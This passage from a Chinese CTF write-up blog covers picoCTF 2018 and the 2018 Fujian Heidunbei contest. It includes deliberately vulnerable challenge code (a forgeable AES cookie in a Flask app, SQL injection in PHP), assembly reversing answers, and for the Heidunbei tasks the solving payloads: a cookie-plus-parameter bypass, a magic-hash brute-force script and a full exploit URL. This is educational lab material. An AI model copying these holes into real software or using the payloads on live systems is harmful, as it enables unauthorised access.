class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'seed removed'</span></span><br><span class="line">flag_value = <span class="string">'flag removed'</span></span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span>  <span class="comment"># Bytes</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \</span><br><span class="line">                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-ord(s[len(s) - <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'user'</span>] == <span class="string">'admin'</span>:</span><br><span class="line">        message = <span class="string">"I'm sorry the admin password is super secure. You're not getting in that way."</span></span><br><span class="line">        category = <span class="string">'danger'</span></span><br><span class="line">        flash(message, category)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    resp = make_response(redirect(<span class="string">"/flag"</span>))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;&#125;</span><br><span class="line">    cookie[<span class="string">'password'</span>] = request.form[<span class="string">'password'</span>]</span><br><span class="line">    cookie[<span class="string">'username'</span>] = request.form[<span class="string">'user'</span>]</span><br><span class="line">    cookie[<span class="string">'admin'</span>] = <span class="number">0</span></span><br><span class="line">    print(cookie)</span><br><span class="line">    cookie_data = json.dumps(cookie, sort_keys=<span class="keyword">True</span>)</span><br><span class="line">    encrypted = AESCipher(app.secret_key).encrypt(cookie_data)</span><br><span class="line">    print(encrypted)</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, encrypted)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(redirect(<span class="string">"/"</span>))</span><br><span class="line">    resp.set_cookie(<span class="string">'cookie'</span>, <span class="string">''</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      encrypted = request.cookies[<span class="string">'cookie'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">      flash(<span class="string">"Error: Please log-in again."</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'main'</span>))</span><br><span class="line">  data = AESCipher(app.secret_key).decrypt(encrypted)</span><br><span class="line">  data = json.loads(data)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">     check = data[<span class="string">'admin'</span>]</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">     check = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> check == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">'flag.html'</span>, value=flag_value)</span><br><span class="line">  flash(<span class="string">"Success: You logged in! Not sure you'll be able to see the flag though."</span>, <span class="string">"success"</span>)</span><br><span class="line">  <span class="keyword">return</span> render_template(<span class="string">'not-flag.html'</span>, cookie=data)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">        c = AESCipher('password').encrypt('message')</span></span><br><span class="line"><span class="string">        m = AESCipher('password').decrypt(c)</span></span><br><span class="line"><span class="string">    Tested under Python 3 and PyCrypto 2.6.1.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.key = md5(key.encode(<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">        raw = pad(raw)</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> b64encode(iv + cipher.encrypt(raw))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></span><br><span class="line">        enc = b64decode(enc)</span><br><span class="line">        iv = enc[:<span class="number">16</span>]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> unpad(cipher.decrypt(enc[<span class="number">16</span>:])).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h2 id="【X】A-Simple-Question"><a href="#【X】A-Simple-Question" class="headerlink" title="【X】A Simple Question"></a>【X】A Simple Question</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include &quot;config.php&quot;;</span><br><span class="line">  ini_set(&apos;error_reporting&apos;, E_ALL);</span><br><span class="line">  ini_set(&apos;display_errors&apos;, &apos;On&apos;);</span><br><span class="line"></span><br><span class="line">  $answer = $_POST[&quot;answer&quot;];</span><br><span class="line">  $debug = $_POST[&quot;debug&quot;];</span><br><span class="line">  $query = &quot;SELECT * FROM answers WHERE answer=&apos;$answer&apos;&quot;;</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  echo &quot;SQL query: &quot;, htmlspecialchars($query), &quot;\n&quot;;</span><br><span class="line">  echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  $con = new SQLite3($database_file);</span><br><span class="line">  $result = $con-&gt;query($query);</span><br><span class="line"></span><br><span class="line">  $row = $result-&gt;fetchArray();</span><br><span class="line">  if($answer == $CANARY)  &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Perfect!&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  elseif ($row) &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;You are so close.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h1&gt;Wrong.&lt;/h1&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="reversing"><a href="#reversing" class="headerlink" title="reversing"></a>reversing</h1><h2 id="assembly-0"><a href="#assembly-0" class="headerlink" title="assembly-0"></a>assembly-0</h2><p>What does asm0(0xd8,0x7a) return? 0x7a。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm0</span><br><span class="line"></span><br><span class="line">asm0:</span><br><span class="line">pushebp</span><br><span class="line">movebp,esp</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">movebx,DWORD PTR [ebp+0xc]</span><br><span class="line">moveax,ebx</span><br><span class="line">movesp,ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-1"><a href="#assembly-1" class="headerlink" title="assembly-1"></a>assembly-1</h2><p>What does asm1(0xcd) return? 0xca。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm1</span><br><span class="line"></span><br><span class="line">asm1:</span><br><span class="line">pushebp</span><br><span class="line">movebp,esp</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0xde</span><br><span class="line">jg part_a</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0x8</span><br><span class="line">jnepart_b</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">addeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_a:</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0x4e</span><br><span class="line">jnepart_c</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_b:</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">cmpDWORD PTR [ebp+0x8],0xee</span><br><span class="line">jnepart_c</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">subeax,0x3</span><br><span class="line">jmppart_d</span><br><span class="line">part_c:</span><br><span class="line">moveax,DWORD PTR [ebp+0x8]</span><br><span class="line">addeax,0x3</span><br><span class="line">part_d:</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-2"><a href="#assembly-2" class="headerlink" title="assembly-2"></a>assembly-2</h2><p>What does asm2(0x7,0x28) return?   <code>hex(int((0xa1df-0x7)/float(0x76))+1+0x28)</code> =&gt; 0x188</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm2</span><br><span class="line"></span><br><span class="line">asm2:</span><br><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">sub    esp,0x10</span><br><span class="line">mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">mov DWORD PTR [ebp-0x4],eax</span><br><span class="line">mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">movDWORD PTR [ebp-0x8],eax</span><br><span class="line">jmp    part_b</span><br><span class="line">part_a:</span><br><span class="line">add    DWORD PTR [ebp-0x4],0x1</span><br><span class="line">addDWORD PTR [ebp+0x8],0x76</span><br><span class="line">part_b:</span><br><span class="line">cmp    DWORD PTR [ebp+0x8],0xa1de</span><br><span class="line">jle    part_a</span><br><span class="line">mov    eax,DWORD PTR [ebp-0x4]</span><br><span class="line">movesp,ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="assembly-3"><a href="#assembly-3" class="headerlink" title="assembly-3"></a>assembly-3</h2><p>What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  0x478</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp+0x8=&gt;0xbda42100</span><br><span class="line">ebp+0xc=&gt;0xb98dd6a5</span><br><span class="line">ebp+0x10=&gt;0xecded223</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.bits 32</span><br><span class="line"></span><br><span class="line">.global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp,esp</span><br><span class="line">        mov     eax,0xbc;0xbc</span><br><span class="line">        xor     al,al;0x00</span><br><span class="line">        mov     ah,BYTE PTR [ebp+0x9];0x2100</span><br><span class="line">        sal     ax,0x10;0x0000</span><br><span class="line">        sub     al,BYTE PTR [ebp+0xc];0x005b</span><br><span class="line">        add     ah,BYTE PTR [ebp+0xd];0xd65b</span><br><span class="line">        xor     ax,WORD PTR [ebp+0x10];0xd65b^0xd223=0x478</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>有几点需要注意。一是数据采用小端序存储，高字节在高地址，[ebp+0x8]的值是0x00而非0xbd；二是 <code>sub 0x00,0xa5</code> 的值是<code>0x100-0xa5=0x5b</code> 。 三是<code>WORD PTR [ebp+0x10]</code> 的值是<code>0xd223</code> 而非<code>0x23d2</code> 。</p><p><img src="1541310455800.png" alt="1541310455800"></p><p>可参考 <a href="https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md" target="_blank" rel="noopener">此处</a> 将汇编代码编译成共享库在C程序中调用。执行得到结果，也可调试加深理解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global asm3</span><br><span class="line"></span><br><span class="line">asm3:</span><br><span class="line">push   ebp</span><br><span class="line">mov    ebp,esp</span><br><span class="line">moveax,0x19</span><br><span class="line">xoral,al</span><br><span class="line">movah,BYTE [ebp+0xa]</span><br><span class="line">salax,0x10</span><br><span class="line">subal,BYTE [ebp+0xd]</span><br><span class="line">addah,BYTE [ebp+0xc]</span><br><span class="line">xorax,WORD [ebp+0x12]</span><br><span class="line">movesp, ebp</span><br><span class="line">popebp</span><br><span class="line">ret</span><br><span class="line">##################</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">extern int asm3(int a, int b, int c);</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line"></span><br><span class="line">printf(&quot;0x%x\n&quot;, asm3(0xb5e8e971,0xc6b58a95,0xe20737e9));</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">##################</span><br><span class="line">[andrei@jacky 15:27:00] ~/Documents/pico/3</span><br><span class="line">——&gt; nasm -f elf32 end_asm_rev.S -o asmfun.o</span><br><span class="line">[andrei@jacky 15:27:42] ~/Documents/pico/3</span><br><span class="line">——&gt; gcc sol.c asmfun.o -o sol -m32</span><br><span class="line">[andrei@jacky 15:27:59] ~/Documents/pico/3</span><br><span class="line">——&gt; ./sol</span><br></pre></td></tr></table></figure><h2 id="assembly-4"><a href="#assembly-4" class="headerlink" title="assembly-4"></a>assembly-4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/pico18<span class="comment"># nasm -f elf32 comp.nasm -o comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># gcc -m32 -o comp comp.o</span></span><br><span class="line">root@kali:~/ctf/pico18<span class="comment"># ./comp</span></span><br><span class="line">picoCTF&#123;1_h0p3_y0u_c0mP1l3d_tH15_32429699163</span><br></pre></td></tr></table></figure><p><code>picoCTF{1_h0p3_y0u_c0mP1l3d_tH15_3242969916}</code> </p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>福建省黑盾杯解题报告</title>
      <link href="/180920-heidunbei/"/>
      <url>/180920-heidunbei/</url>
      
        <content type="html"><![CDATA[<p>2018/9/16  福师大黑盾杯</p><p><img src="1541605429359.png" alt="1541605429359"></p><h1 id="信息泄露-代码审计"><a href="#信息泄露-代码审计" class="headerlink" title="信息泄露+代码审计"></a>信息泄露+代码审计</h1><p>svn泄露源码：<a href="http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt" target="_blank" rel="noopener">http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$user = $_COOKIE[<span class="string">'user'</span>];</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?(int)$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($user == <span class="string">'admin'</span> &amp;&amp; !<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">$hex = (int)$code;</span><br><span class="line"><span class="keyword">if</span>(($hex ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>GET</code> 请求<code>code=55146</code> ，  请求头添加<code>Cookie: user=admin;</code> 。</p><p><code>flag{a737c5c5b759c3705c8100accf65b5e4}</code> </p><h1 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">$a=<span class="number">0</span>; </span><br><span class="line">$b=<span class="number">0</span>; </span><br><span class="line">$c=<span class="number">0</span>; </span><br><span class="line">$d=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) <span class="comment">//$x1=0;=&gt;$a=1;</span></span><br><span class="line">&#123; </span><br><span class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </span><br><span class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">switch</span> ($x1) </span><br><span class="line">        &#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">                $a=<span class="number">1</span>; </span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </span><br><span class="line"><span class="comment">//$x2=json_encode(['x21'=&gt;'2018hello','x22'=&gt;[[],0]]) ;</span></span><br><span class="line"><span class="comment">//string(32) "&#123;"x21":"2018hello","x22":[[],0]&#125;"</span></span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123; </span><br><span class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </span><br><span class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </span><br><span class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </span><br><span class="line">        <span class="comment">//array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 </span></span><br><span class="line">        <span class="comment">//mixed array_search( mixed $needle, array $haystack[, bool $strict = false] )</span></span><br><span class="line">        <span class="comment">//第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。</span></span><br><span class="line">        <span class="comment">//var_dump(array_search('XIPU', array("0","1",0)));//int(2)</span></span><br><span class="line">        <span class="comment">//0==‘XIPU’为真，搜索到0值的下标为2</span></span><br><span class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </span><br><span class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $c=<span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </span><br><span class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </span><br><span class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </span><br><span class="line">            <span class="comment">//两个符合正则  /0e\d+/  的字符串弱相等。</span></span><br><span class="line">            <span class="comment">// 爆破见下方python代码</span></span><br><span class="line">            $d=<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">                    x = chr(a) + chr(b) + chr(c)+s</span><br><span class="line">                    mm=md5(x.encode(<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> mm[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">                        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                            flag=<span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">and</span> mm[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</span><br><span class="line">                        print(x)</span><br><span class="line"></span><br><span class="line">brute()</span><br><span class="line"><span class="comment"># kN[XIPU</span></span><br><span class="line"><span class="comment"># v=|XIPU</span></span><br><span class="line"><span class="comment"># y'wXIPU</span></span><br><span class="line"><span class="comment"># &#125;MOXIPU</span></span><br><span class="line"><span class="comment"># ~VhXIPU</span></span><br><span class="line"><span class="comment">## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2=&#123;%22x21%22:%222018hello%22,%22x22%22:[[],0]&#125;&amp;x3=~VhXIPU</span></span><br><span class="line"><span class="comment">## flag&#123;510ea2879fa29d0d618b1f55350965c3&#125;</span></span><br></pre></td></tr></table></figure><h1 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h1><p>和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 <a href="https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf">该题</a> ，不赘述。</p><figure 